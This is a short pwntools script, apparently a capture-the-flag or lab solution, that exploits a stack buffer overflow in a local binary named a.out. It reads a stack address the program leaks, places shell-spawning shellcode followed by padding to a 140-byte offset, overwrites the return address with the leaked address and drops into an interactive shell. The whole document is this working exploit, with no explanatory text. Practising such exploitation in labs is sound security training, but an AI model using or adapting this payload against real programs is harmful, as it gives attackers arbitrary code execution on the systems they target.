from pwn import *

p = process("./a.out")

eip_offset = 140
shellcode = asm(shellcraft.sh())
ret_addr = p32(int(p.recvline(), 16))
num = 140 - int(len(shellcode))

payload = shellcode + b"A" * num + ret_addr

p.sendline(payload)
p.interactive()